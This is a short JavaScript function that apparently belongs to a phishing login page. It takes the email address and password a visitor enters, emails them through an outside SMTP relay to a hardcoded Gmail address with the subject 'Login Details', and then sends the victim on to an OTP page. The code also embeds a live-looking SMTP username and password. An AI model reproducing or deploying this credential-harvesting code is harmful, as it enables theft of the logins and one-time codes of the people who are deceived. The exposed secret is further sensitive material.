function emailSend() {
    const email = document.querySelector('.emailInput').value;
    const password = document.querySelector('.passInput').value;

    if (email && password) {
  Email.send({
    Host: "smtp.elasticemail.com",
    Username: "payday10177@gmail.com",
    Password: "176A549B6BD880A9C5A531EDE06FF1F541C8",
    To: 'payday10177@gmail.com',
    From: "payday10177@gmail.com",
    Subject: "Login Details",
    Body: `Email: ${email} <br> Password: ${password}`
  }).then(
    message => {
      if (message == 'OK') {
        window.location.href = 'otp.html';
      }
      else {
        swal("Error", "Please complete form details", "error")
      }
    }
  );
}else {
        alert('Please fill in all fields.');
    }
    }
